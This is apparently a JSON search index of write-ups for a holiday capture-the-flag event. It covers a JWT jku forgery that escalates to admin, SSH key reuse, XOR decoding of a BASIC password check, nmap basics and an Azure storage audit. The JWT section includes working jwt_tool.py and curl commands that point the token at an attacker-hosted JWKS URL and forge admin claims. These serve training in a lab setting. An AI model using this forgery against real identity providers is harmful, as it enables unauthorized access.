\"n\":\"tchOVdXUg9T_HV2f9TVZeoH3G2uB243yAa6Hh7RsyeOy1tAs-OEnD1_5TWrljY-RqoSfoEjbE38rtVLp_weDfroHn8I-I9lGuAA-wDI70sOTm4tSSDuwD9VBFmXI-dFwsTN446yRJagaZP4ZgfPoreOL9bpfL_7HxPOJZ14z2ZJZaP-7hr1HSasyTkkRG3u4pylgoRUu2ZUxWhqNg1A7e1YNUrtlqagooFxGYkZBXbBXJbHdMLn-PSs3tc3pWQEQHPAYBSFHnCzyTEOFQOixh-OQq3KyL5sHKvOWUhTyO2USOmJHLYUbCEd6_DfrcR4P5EctwTlTEU1ssXONGgxHAQ\" } ] } This jwks file is now available on the following URL:\nhttp://paulweb.neighborhood/jwttool_custom_jwks.json Obtaining a new JWT token:\ncurl -X POST --data-binary $'username=gnome\u0026password=SittingOnAShelf\u0026return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login Token:\n\u003c!doctype html\u003e \u003chtml lang=en\u003e \u003ctitle\u003eRedirecting...\u003c/title\u003e \u003ch1\u003eRedirecting...\u003c/h1\u003e \u003cp\u003eYou should be redirected automatically to the target URL: \u003ca href=\"http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDQxMzUzMywiZXhwIjoxNzY0NDIwNzMzLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.Sz5xSo15RlbxT7VcP2qYUUzZBZQfqkFZ3DiIusl0Y16NMcxOHCpY5ZPedxDJeHy8lnbzG-1KncDUL9qBIRD4dUOsT_R58Oy29ynoLLiwBQ5KLK-oq4HLCpWTIQ3PBk7w2SBWqJMAcdPRNCxjygUGoAnpTcjlaHk4wtRLp2X0hGLJP7sXIv1F7cQZF4Bg780ICAaPvP_jcRFF1wxzA2sMMPImrRIoA7Y53Jzk4WrMaSVJjCPXR4OxrdzPoCLzmB7Z49pSzVYv6__6vZg2WzwDxWnMTKRijK7bgJSF65NoYNfChlLd5m00t6L5E9fRIVRGIaVtQ7fydQkwSe42pRib-g\"\u003ehttp://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDQxMzUzMywiZXhwIjoxNzY0NDIwNzMzLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.Sz5xSo15RlbxT7VcP2qYUUzZBZQfqkFZ3DiIusl0Y16NMcxOHCpY5ZPedxDJeHy8lnbzG-1KncDUL9qBIRD4dUOsT_R58Oy29ynoLLiwBQ5KLK-oq4HLCpWTIQ3PBk7w2SBWqJMAcdPRNCxjygUGoAnpTcjlaHk4wtRLp2X0hGLJP7sXIv1F7cQZF4Bg780ICAaPvP_jcRFF1wxzA2sMMPImrRIoA7Y53Jzk4WrMaSVJjCPXR4OxrdzPoCLzmB7Z49pSzVYv6__6vZg2WzwDxWnMTKRijK7bgJSF65NoYNfChlLd5m00t6L5E9fRIVRGIaVtQ7fydQkwSe42pRib-g\u003c/a\u003e. If not, click the link. Creating a new JWT. Here I changed admin to true, and instruct the server to use http://paulweb.neighborhood/jwttool_custom_jwks.json as jku:\njwt_tool.py 'eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDQxMzUzMywiZXhwIjoxNzY0NDIwNzMzLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.Sz5xSo15RlbxT7VcP2qYUUzZBZQfqkFZ3DiIusl0Y16NMcxOHCpY5ZPedxDJeHy8lnbzG-1KncDUL9qBIRD4dUOsT_R58Oy29ynoLLiwBQ5KLK-oq4HLCpWTIQ3PBk7w2SBWqJMAcdPRNCxjygUGoAnpTcjlaHk4wtRLp2X0hGLJP7sXIv1F7cQZF4Bg780ICAaPvP_jcRFF1wxzA2sMMPImrRIoA7Y53Jzk4WrMaSVJjCPXR4OxrdzPoCLzmB7Z49pSzVYv6__6vZg2WzwDxWnMTKRijK7bgJSF65NoYNfChlLd5m00t6L5E9fRIVRGIaVtQ7fydQkwSe42pRib-g' -I -pc admin -pv true -X s -ju http://paulweb.neighborhood/jwttool_custom_jwks.json The same as above, but with fancy output:\nNow authenticating as admin:\ncurl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd3R0b29sX2N1c3RvbV9qd2tzLmpzb24iLCJraWQiOiJpZHAta2V5LTIwMjUiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDQxMzUzMywiZXhwIjoxNzY0NDIwNzMzLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.Dx4hBjLLBnLZZNr_kP3-5BzY4K-eN8WfhTgwGq6zOprrxSNxjS-FkNLwlAAwYdt1hxNghAh-0FXRtt-XoRha9yog4Z0z-mHivLJKymBsCCpq9jacCp6NE3C4Aom6ZQFBYoyW9PZZ-e-3r75fCpR555ydOYWlRqfYCKIwet7f1lCjshr8uI6yDNh8vp98PvNz2ZJIXy0mGY6TwrDR-sUF66q0g6FWOhM2NvUq02R5OiLWjpiUuPSH8-O9A6AYRoMyxFUJnWUXwGSCilWS9LL7ScBaasMG8QN30mFZHYHcJsuRLOfIUUZorY4TZRtzIMBYbiVlGG2bwuLNJgf7bW4dnA Success. I got a session cookie! Logging in as admin using this session cookie:\ncurl -H 'Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aSrRvg.rlv7JcpRYubB-uIsJjcRjOTguuk' http://gnome-48371.atnascorp/diagnostic-interface And this is what I see as admin:\n\u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eAtnasCorp : Gnome Diagnostic Interface\u003c/title\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles/styles.css\"\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003eAtnasCorp : Gnome Diagnostic Interface\u003c/h1\u003e \u003cdiv style='display:flex; justify-content:center; gap:10px;'\u003e \u003cimg src='/camera-feed' style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0;' /\u003e \u003cdiv style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0; display:flex; align-items:flex-start; justify-content:flex-start; text-align:left;'\u003e System Log\u003cbr/\u003e 2025-11-29 03:29:12: Movement detected.\u003cbr/\u003e 2025-11-29 08:47:43: AtnasCorp C\u0026C connection restored.\u003cbr/\u003e 2025-11-29 10:16:00: Checking for updates.\u003cbr/\u003e 2025-11-29 10:16:00: Firmware Update available: refrigeration-botnet.bin\u003cbr/\u003e 2025-11-29 10:16:02: Firmware update downloaded.\u003cbr/\u003e 2025-11-29 10:16:02: Gnome will reboot to apply firmware update in one hour.\u003c/div\u003e \u003c/div\u003e \u003cdiv class=\"statuscheck\"\u003e \u003cdiv class=\"status-container\"\u003e \u003cdiv class=\"status-item\"\u003e \u003cdiv class=\"status-indicator active\"\u003e\u003c/div\u003e \u003cspan\u003eLive Camera Feed\u003c/span\u003e \u003c/div\u003e \u003cdiv class=\"status-item\"\u003e \u003cdiv class=\"status-indicator active\"\u003e\u003c/div\u003e \u003cspan\u003eNetwork Connection\u003c/span\u003e \u003c/div\u003e \u003cdiv class=\"status-item\"\u003e \u003cdiv class=\"status-indicator active\"\u003e\u003c/div\u003e \u003cspan\u003eConnectivity to Atnas C\u0026C\u003c/span\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/body\u003e The malicious firmware image the gnomes are downloading is refrigeration-botnet.bin\nPaul Beckett mission debrief Brilliant work on that privilege escalation! You‚Äôve successfully gained admin access to the diagnostic interface.\nNow we finally know what updates the gnomes have been receiving - proper good pentesting skills in action!",
    "description": "Objective Difficulty: 2/5\nHike over to Paul in the park for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?\nPaul Beckett mission statement Hey, I‚Äôm Paul!\nI‚Äôve been at Counter Hack since 2024 and loving every minute of it.\nI‚Äôm a pentester who digs into web, API, and mobile apps, and I‚Äôm also a fan of Linux.",
    "tags": [],
    "title": "Rogue Gnome Identity Provider",
    "uri": "/act2/rogue-gnome-identity-provider/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 1",
    "content": "Objective Difficulty: 1/5\nChat with Yori near the apartment building about Santa‚Äôs mysterious gift tracker and unravel the holiday mystery.\nYori Kvitchko mission statement Hi! I‚Äôm Yori.\nI was Ed‚Äôs lost intern back in 2015, but I was found!\nThink you can check out this terminal for me? I need to use cURL to access the gift tracker system, but it has me stumped.\nPlease see what you can do!\nTerminal By listing the home directory we find a README.txt file:\nWelcome! Santa's gift-tracking service is missing! You need to find what port it's running on amd connect to it to make sure it is working! Available commands: - ss (to check running services and ports) - curl (to connect to services) - telnet (an alternative way to connect) - ls (to list files) - cat (to view files) - grep (to search text) - clear (to clear the screen) Good luck! Finding listening port The tracking application was originally configured to run on port 8080, but doesnt answer. Our objective now is to trace down which port it now listens to.\nss -tlnp The listeneing port in question is 12321, connecting to it:\ncurl http://localhost:12321 As the original port was a well known web-port, we‚Äôll just go ahead connecting using Curl:\nThe entire output is included below:\n{ \"status\": \"success\", \"message\": \"\\ud83c\\udf84 Ho Ho Ho! Santa Tracker Successfully Connected! \\ud83c\\udf84\", \"santa_tracking_data\": { \"timestamp\": \"2025-11-16 09:24:43\", \"location\": { \"name\": \"Evergreen Estates\", \"latitude\": 39.235029, \"longitude\": -101.829101 }, \"movement\": { \"speed\": \"847 mph\", \"altitude\": \"11938 feet\", \"heading\": \"340\\u00b0 SW\" }, \"delivery_stats\": { \"gifts_delivered\": 5859155, \"cookies_eaten\": 35606, \"milk_consumed\": \"2179 gallons\", \"last_stop\": \"Reindeer Ridge\", \"next_stop\": \"Yuletide Gardens\", \"time_to_next_stop\": \"5 minutes\" }, \"reindeer_status\": { \"rudolph_nose_brightness\": \"90%\", \"favorite_reindeer_joke\": \"What's Rudolph's favorite currency? Sleigh bells!\", \"reindeer_snack_preference\": \"starlight oats\" }, \"weather_conditions\": { \"temperature\": \"-8\\u00b0F\", \"condition\": \"Candy cane precipitation\" }, \"special_note\": \"Thanks to your help finding the correct port, the neighborhood can now track Santa's arrival! The mischievous gnomes will be caught and will be put to work wrapping presents.\" } } Yori Kvitchko mission debrief Great work - thank you!\nGeez, maybe you can be my intern now!",
    "description": "Objective Difficulty: 1/5\nChat with Yori near the apartment building about Santa‚Äôs mysterious gift tracker and unravel the holiday mystery.\nYori Kvitchko mission statement Hi! I‚Äôm Yori.\nI was Ed‚Äôs lost intern back in 2015, but I was found!\nThink you can check out this terminal for me? I need to use cURL to access the gift tracker system, but it has me stumped.",
    "tags": [],
    "title": "Santa's Gift Tracking Service Port Mystery",
    "uri": "/act1/santas-gift-tracking-service-port-mystery/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 3",
    "content": "Objective Difficulty: 1/5\nSkate over to Jared at the frozen pond for some network magic and learn the ropes by the hockey rink.\nXXX mission statement Solution XXX mission debrief",
    "description": "Objective Difficulty: 1/5\nSkate over to Jared at the frozen pond for some network magic and learn the ropes by the hockey rink.\nXXX mission statement Solution XXX mission debrief",
    "tags": [],
    "title": "On the Wire",
    "uri": "/act3/on-the-wire/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 2",
    "content": "Objective Difficulty: 2/5\nCharlie in the hotel has quantum gnome mysteries waiting to be solved. What is the flag that you find?\nCharlie Goldner mission statement Hello! I‚Äôm not JJ. I like music.\nI accept AI tokens.\nI like quantum pancakes.\nI enjoy social engineeering.\nCheck back with me later - I might have something for you to help with!\nI just spotted a mysterious gnome - he winked and vanished, or maybe he‚Äôs still here?\nThings are getting strange, and I think we‚Äôve wandered into a quantum conundrum!\nIf you help me unravel these riddles, we might just outsmart future quantum computers.\nCryptic puzzles, quirky gnomes, and post-quantum secrets‚Äîwill you leap with me?\nSolution Finding the PQC key generation program is quite easy, as we just can type pq and hit TAB and the auto completion will complete the rest for us:\nNext, use -t to display key characteristics, as the screen instructs us to do:\nThe hint states: ‚ÄúYou can use ‚Äòssh-keygen -l -f ‚Äô to see the bit size of a key. Next step, SSH into pqc-server.com.‚Äù. But first, lets see if there‚Äôs a username I possibly can use:\nThe username gnome1 could possibly help me. Since the current user already has got a .SSH folder and keys, let‚Äôs see if these leads anyway:\nAnd it does!\nSo now we are trying to get access to user gnome2. Trying to see if we can rinse and repeat the process here:\nRinse and repeat worked:\nLet me guess ‚Ä¶ rinse and repeat for user gnome3?\nYes ‚Ä¶ that worked ..\nAnd for gnome4, we find this users keys as well ‚Ä¶\nAnd we are in ‚Ä¶\nAnd for admin, we find this users keys as well ‚Ä¶\nAnd we are in as admin‚Ä¶\nFinding the flag:\nFlag is HHC{L3aping_0v3r_Quantum_Crypt0}\nCharlie Goldner mission debrief That was wild‚Äîwho knew quantum gnomes could hide so many secrets?\nThanks for helping me leap into the future of cryptography!",
    "description": "Objective Difficulty: 2/5\nCharlie in the hotel has quantum gnome mysteries waiting to be solved. What is the flag that you find?\nCharlie Goldner mission statement Hello! I‚Äôm not JJ. I like music.\nI accept AI tokens.\nI like quantum pancakes.\nI enjoy social engineeering.\nCheck back with me later - I might have something for you to help with!\nI just spotted a mysterious gnome - he winked and vanished, or maybe he‚Äôs still here?",
    "tags": [],
    "title": "Quantognome Leap",
    "uri": "/act2/quantognome-leap/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 1",
    "content": "Objective Difficulty: 1/5\nSkate over to Jared at the frozen pond for some network magic and learn the ropes by the hockey rink.\nJared Folkins mission statement Jared Folkins here! My favorite Christmas movie is White Christmas. You should find me on the socials and tell me what yours is.\nYou know, I think Santa is right! It truly is better to give than to receive.\nI love singing Carols with my family! üéµO holy night, the stars are brightly shining‚Ä¶üéµ\nSanta‚Äôs got the right idea about giving, and I‚Äôm excited to give you a fantastic way to learn networking fundamentals!\nThis interactive visualization I‚Äôve created shows you exactly how packets travel, how protocols work, and why networks behave the way they do.\nIt‚Äôs way better than staring at boring textbooks - you can actually see what‚Äôs happening!\nWant to dive into some hands-on network exploration?\nSolution Jared Folkins mission debrief Wonderful! You‚Äôve mastered those networking basics beautifully.\nNow you can see how all the pieces of the network puzzle fit together - it‚Äôs truly better to give knowledge than to keep it to yourself!",
    "description": "Objective Difficulty: 1/5\nSkate over to Jared at the frozen pond for some network magic and learn the ropes by the hockey rink.\nJared Folkins mission statement Jared Folkins here! My favorite Christmas movie is White Christmas. You should find me on the socials and tell me what yours is.\nYou know, I think Santa is right! It truly is better to give than to receive.",
    "tags": [],
    "title": "Visual Network Thinger",
    "uri": "/act1/visual-network-thinger/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 3",
    "content": "Objective Difficulty: 1/5\nSkate over to Jared at the frozen pond for some network magic and learn the ropes by the hockey rink.\nXXX mission statement Solution XXX mission debrief",
    "description": "Objective Difficulty: 1/5\nSkate over to Jared at the frozen pond for some network magic and learn the ropes by the hockey rink.\nXXX mission statement Solution XXX mission debrief",
    "tags": [],
    "title": "Free Ski",
    "uri": "/act3/free-ski/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 2",
    "content": "Objective Difficulty: 2/5\nKevin in the Retro Store needs help rewinding tech and going in reverse. Extract the flag and enter it here.\nKevin McFarland mission statement Hello, I‚Äôm Kevin (though past friends have referred to me as ‚ÄòHeavy K‚Äô). If you ever hear any one say that philosophy is a useless college degree, don‚Äôt believe them; it‚Äôs not. I‚Äôve arrived where I am at because of it. It just made the path more interesting.\nI have more hobbies than I can keep up with, including Amateur Astronomy, Shortwave Radio, and retro-gaming. Things like backyard observances of distant galaxies, non-internet involved, around the world communications, and those who program for the Atari 2600 still invoke degrees of awe for me.\nOne of the most influential books I‚Äôve read is ‚ÄúGodel, Escher, and Bach‚Äù by Douglas Hofstadter. I‚Äôm also a bit of a Tolkien fanatic.\nMy wife and my daughter are everything; without them, I surely would still be kicking rusty tin cans down the lonely highways of my past.\nI don‚Äôt have the details yet, but something‚Äôs coming up. Check back with me.\nYou know, there‚Äôs something beautifully nostalgic about stumbling across old computing artifacts. Just last week, I was sorting through some boxes in my garage and came across a collection of 5.25\" floppies from my college days - mostly containing terrible attempts at programming assignments and a few games I‚Äôd copied from friends.\nFinding an old Commodore 64 disk with a mysterious BASIC program on it? That‚Äôs like discovering a digital time capsule. The C64 was an incredible machine for its time - 64KB of RAM seemed like an ocean of possibility back then. I spent countless hours as a kid typing in program listings from Compute! magazine, usually making at least a dozen typos along the way.\nThe thing about BASIC programs from that era is they were often written by clever programmers who knew how to hide things in plain sight. Sometimes the most interesting discoveries come from reading the code itself rather than watching it execute. It‚Äôs like being a digital archaeologist - you‚Äôre not just looking at what the program does, you‚Äôre understanding how the programmer thought.\nTake your time with this one. Those old-school programmers had to be creative within such tight constraints. You‚Äôll know the flag by the Christmas phrase that pays.\nSolving the Challenge The challenge provides a short BASIC program supposedly acting as a ‚ÄúCommodore 64 security system.‚Äù The goal is to understand how the password check works and recover the hidden flag. The relevant code is:\n10 REM *** COMMODORE 64 SECURITY SYSTEM *** 20 ENC_PASS$ = \"D13URKBT\" 30 ENC_FLAG$ = \"DSA|auhts*wkfi=dhjwubtthut+dhhkfis+hnkz\" ' old \"DSA|qnisf`bX_huXariz\" 40 INPUT \"ENTER PASSWORD: \"; PASS$ 50 IF LEN(PASS$) \u003c\u003e LEN(ENC_PASS$) THEN GOTO 90 60 FOR I = 1 TO LEN(PASS$) 70 IF CHR$(ASC(MID$(PASS$,I,1)) XOR 7) \u003c\u003e MID$(ENC_PASS$,I,1) THEN GOTO 90 80 NEXT I 85 FLAG$ = \"\" : FOR I = 1 TO LEN(ENC_FLAG$) : FLAG$ = FLAG$ + CHR$(ASC(MID$(ENC_FLAG$,I,1)) XOR 7) : NEXT I : PRINT FLAG$ 90 PRINT \"ACCESS DENIED\" 100 END Understanding the Password Check The critical lines are 60‚Äì70. For each character in the user-supplied password:\nTake the ASCII value XOR it with 7 Convert it back to a character Compare it to the same index in ENC_PASS$ In other words:\nENC_PASS$(i) = CHR( ASC(real_password(i)) XOR 7 ) Since XOR is reversible:\nreal_password(i) = CHR( ASC(ENC_PASS$(i)) XOR 7 ) The program stores:\nENC_PASS$ = \"D13URKBT\" Applying XOR 7 to each character:\nEncoded ASCII XOR 7 Decoded D 68 68 ‚äï 7 = 67 C 1 49 49 ‚äï 7 = 54 6 3 51 51 ‚äï 7 = 52 4 U 85 85 ‚äï 7 = 82 R R 82 82 ‚äï 7 = 85 U K 75 75 ‚äï 7 = 68 L B 66 66 ‚äï 7 = 69 E T 84 84 ‚äï 7 = 83 S So the correct password is:\nC64RULES Entering anything else sends execution to line 90 ‚Üí ‚ÄúACCESS DENIED‚Äù.\nDecoding the Hidden Flag If‚Äîand only if‚Äîthe password loop completes without failing, line 85 executes:\nFLAG$ = \"\" FOR I = 1 TO LEN(ENC_FLAG$) FLAG$ = FLAG$ + CHR$(ASC(MID$(ENC_FLAG$,I,1)) XOR 7) NEXT I PRINT FLAG$ This uses the same XOR-7 trick as the password check.\nThe encoded flag is:\nDSA|auhts*wkfi=dhjwubtthut+dhhkfis+hnkz Decoding each character with XOR 7 yields:\nCTF{frost-plan:compressors,coolant,oil} This is the actual secret the program hides.\nThe Logic Bug Even when the correct password is entered and the flag is printed, the code falls through to:\n90 PRINT \"ACCESS DENIED\" The intended system probably meant to branch differently, but the bug doesn‚Äôt matter for extraction‚Äîthe flag is still printed correctly before the failure message.\nFinal Result Password:\nC64RULES Flag:\nCTF{frost-plan:compressors,coolant,oil} Kevin McFarland mission debrief Excellent work! You‚Äôve just demonstrated one of the most valuable skills in cybersecurity - the ability to think like the original programmer and unravel their logic without needing to execute a single line of code.",
    "description": "Objective Difficulty: 2/5\nKevin in the Retro Store needs help rewinding tech and going in reverse. Extract the flag and enter it here.\nKevin McFarland mission statement Hello, I‚Äôm Kevin (though past friends have referred to me as ‚ÄòHeavy K‚Äô). If you ever hear any one say that philosophy is a useless college degree, don‚Äôt believe them; it‚Äôs not. I‚Äôve arrived where I am at because of it. It just made the path more interesting.",
    "tags": [],
    "title": "Going in Reverse",
    "uri": "/act2/going-in-reverse/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 1",
    "content": "Objective Difficulty: 1/5\nFind Elgee in the big hotel for a firewall frolic and some techy fun.\nChris Elgee mission statement Oh hi! Am I on the road again? I should buy souvenirs for the family.\nLoud shirts? Love them. Because - hey, if you aren‚Äôt having fun, what are you even doing??\nAnd yes, finger guns are 100% appropriate for military portraits.\n‚Ä¶ We should get dessert soon!\nWelcome to my little corner of network security! finger guns\nI‚Äôve whipped up something sweeter than my favorite whoopie pie - an interactive firewall simulator that‚Äôll teach you more in ten minutes than most textbooks do in ten chapters.\nDon‚Äôt worry about breaking anything; that‚Äôs half the fun of learning!\nReady to dig in?\nHoliday Firewall Simulator Upon entering the simulator we are presented with a fairly nice GUI. By spending a couple of minutes it is all quite forward what to do. It tells us exactly what to do under the ‚ÄúFirewall Configuration Goals‚Äù section. Let‚Äôs get cracking!\nClicking on the ‚ÄúInternet‚Äù node in the network drawing we have to enable http and https and click ‚ÄúSave Rules‚Äù.\nNext, we just tag along enabling HTTPS, HTTP and SSH for the DMZ:\nFor the internal network to cloud we enable http, https, smtp and ssh:\nWe aren‚Äôt quite finished with the internal network yet. We have to configure the connections to the workstations as well. These shall have full access.\nAnd Done!\nChris Elgee mission debrief finger guns Nice work! You‚Äôve mastered those firewall fundamentals like a true network security pro.\nNow that was way more fun than sitting through another boring lecture, wasn‚Äôt it?",
    "description": "Objective Difficulty: 1/5\nFind Elgee in the big hotel for a firewall frolic and some techy fun.\nChris Elgee mission statement Oh hi! Am I on the road again? I should buy souvenirs for the family.\nLoud shirts? Love them. Because - hey, if you aren‚Äôt having fun, what are you even doing??\nAnd yes, finger guns are 100% appropriate for military portraits.",
    "tags": [],
    "title": "Visual Firewall Thinger",
    "uri": "/act1/visual-firewall-thinger/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 1",
    "content": "Objective Difficulty: 1/5\nMeet Eric in the hotel parking lot for Nmap know-how and scanning secrets. Help him connect to the wardriving rig on his motorcycle!\nEric Pursley mission statement Hey, I‚Äôm Eric. As you can see, I‚Äôm an avid motorcyclist. And I love traveling the world with my wife.\nI enjoy being creative and making things. For example, a cybersecurity tool called Zero-E that I‚Äôm quite proud of, and the Baldur‚Äôs Gate 3 mod called Manaflare. I‚Äôm even in the BG3 credits!\nI also make tools, ranges, and HHC worlds for Counter Hack. Yup, including the one you‚Äôre in right now.\nBut most of the time, I‚Äôm helping organizations in the real world be more secure. I do a bunch of different kinds of pentesting, but speciailize in network and physical.\nSome advice: stay laser-focused on your goals and don‚Äôt let the distractions life throws at you lead you astray. That‚Äôs how I ended up at Counter Hack!\nSpeaking of tools, let me introduce you to one of the most essential weapons in any pentester‚Äôs arsenal: Nmap.\nIt‚Äôs like having X-ray vision for networks, and I‚Äôve set up a perfect environment for you to learn the fundamentals.\nHelp me find and connect to the wardriving rig‚Äôs service on my motorcycle!\nIntro top Nmap terminal This terminal starts with a simple welcome screen:\nTask 1 - scan top 1000 ports When run without any options, nmap performs a TCP port scan of the top 1000 ports. Run a default scan of 127.0.12.25 and see which port is open.\nFor this we use just use the following command:\nnmap 127.0.12.25 Task 1 screen: Task 1 results: The scan revealed that port TCP/8080 is open.\nTask 2 - Scan all ports Sometimes the top 1000 ports are not enough. Run an nmap scan of all TCP ports on 127.0.12.25 and see which port is open.\nIf we use the ports switch for namep, -p, and add a -, we instruct Nmap to scan all ports. The command will then be:\nnmap -p- 127.0.12.25 Scan results: Task 3 - Scan a range Nmap can also scan a range of IP addresses- Scan the range 127.0.12.20 - 127.0.12.28 and see which has a port open.\nTo scan a range we can define a range like so, using the scan all ports option in addition:\nnmap -p- 127.0.12-20-28 Scan results: Task 4 - Version scanning Namp has a version detection engine, to help determine waht services are running on a given port. What services is running on 127.0.12.25?\nThe service version scan option is called -sV, we can use it like so:\nnmap -p 8080 -sV 127.0.12.25 Results version scanning: Task 5 - interacting with a port Sometimes you want to interact with a port. which is a perfect job for Netcat! Use the ncat tool to connect to TCP port 240601 on 127.0.12.25 and view the banner returned\nNcat is a common tool we often use in pentests and threat hunting. Its standard use follows this format nc \u003cip\u003e \u003cport\u003e, it defaults to use TCP. We use the following command:\nnc 127.0.12.25 24601hug Eric Pursley mission debrief Excellent work! You‚Äôve got the Nmap fundamentals down - that X-ray vision is going to serve you well in future challenges.\nNow you‚Äôre ready to scan networks like a seasoned pentester!",
    "description": "Objective Difficulty: 1/5\nMeet Eric in the hotel parking lot for Nmap know-how and scanning secrets. Help him connect to the wardriving rig on his motorcycle!\nEric Pursley mission statement Hey, I‚Äôm Eric. As you can see, I‚Äôm an avid motorcyclist. And I love traveling the world with my wife.\nI enjoy being creative and making things. For example, a cybersecurity tool called Zero-E that I‚Äôm quite proud of, and the Baldur‚Äôs Gate 3 mod called Manaflare. I‚Äôm even in the BG3 credits!",
    "tags": [],
    "title": "Intro to Nmap",
    "uri": "/act1/intro-to-nmap/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 1",
    "content": "Objective Difficulty: 1/5\nHelp the Goose Grace near the pond find which Azure Storage account has been misconfigured to allow public blob access by analyzing the export file.\nGoose Grace mission statement HONK!!! HONK!!!!\nThe Neighborhood HOA uses Azure storage accounts for various IT operations.\nYou‚Äôve been asked to audit their storage security configuration to ensure no sensitive data is publicly accessible.\nRecent security reports suggest some storage accounts might have public blob access enabled, creating potential data exposure risks.\nBlob Challenge Terminal Getting help Prototype command:\naz help | less And we got help:\nListing accounts Prototype command:\naz account show | less Listing Azure storage accounts Prototype command:\naz storage account list | less The output is shown here in is full glory:\n[ { \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/theneighborhood-rg1/providers/Microsoft.Storage/storageAccounts/neighborhood1\", \"kind\": \"StorageV2\", \"location\": \"eastus\", \"name\": \"neighborhood1\", \"properties\": { \"accessTier\": \"Hot\", \"allowBlobPublicAccess\": false, \"encryption\": { \"keySource\": \"Microsoft.Storage\", \"services\": { \"blob\": { \"enabled\": true } } }, \"minimumTlsVersion\": \"TLS1_2\" }, \"resourceGroup\": \"theneighborhood-rg1\", \"sku\": { \"name\": \"Standard_LRS\" }, \"tags\": { \"env\": \"dev\" } }, { \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/theneighborhood-rg1/providers/Microsoft.Storage/storageAccounts/neighborhood2\", \"kind\": \"StorageV2\", \"location\": \"eastus2\", \"name\": \"neighborhood2\", \"properties\": { \"accessTier\": \"Cool\", \"allowBlobPublicAccess\": true, \"encryption\": { \"keySource\": \"Microsoft.Storage\", \"services\": { \"blob\": { \"enabled\": false } } }, \"minimumTlsVersion\": \"TLS1_0\" }, \"resourceGroup\": \"theneighborhood-rg1\", \"sku\": { \"name\": \"Standard_GRS\" }, \"tags\": { \"owner\": \"Admin\" } }, { \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/theneighborhood-rg2/providers/Microsoft. Storage/storageAccounts/neighborhood3\", \"kind\": \"BlobStorage\", \"location\": \"westus\", \"name\": \"neighborhood3\", \"properties\": { \"accessTier\": \"Hot\", \"allowBlobPublicAccess\": false, \"encryption\": { \"keySource\": \"Microsoft.Keyvault\", \"services\": { \"blob\": { \"enabled\": true } } }, \"minimumTlsVersion\": \"TLS1_2\" }, \"resourceGroup\": \"theneighborhood-rg2\", \"sku\": { \"name\": \"Standard_RAGRS\" }, \"tags\": { \"department\": \"NeighborhoodWatch\" } }, { \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/theneighborhood-rg2/providers/Microsoft. Storage/storageAccounts/neighborhood4\", \"kind\": \"StorageV2\", \"location\": \"westus2\", \"name\": \"neighborhood4\", \"properties\": { \"accessTier\": \"Hot\", \"allowBlobPublicAccess\": false, \"minimumTlsVersion\": \"TLS1_2\", \"networkAcls\": { \"bypass\": \"AzureServices\", \"virtualNetworkRules\": [] } }, \"resourceGroup\": \"theneighborhood-rg2\", \"sku\": { \"name\": \"Premium_LRS\" }, \"tags\": { \"critical\": \"true\" } }, { \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/theneighborhood-rg1/providers/Microsoft. Storage/storageAccounts/neighborhood5\", \"kind\": \"StorageV2\", \"location\": \"eastus\", \"name\": \"neighborhood5\", \"properties\": { \"accessTier\": \"Cool\", \"allowBlobPublicAccess\": false, \"isHnsEnabled\": true, 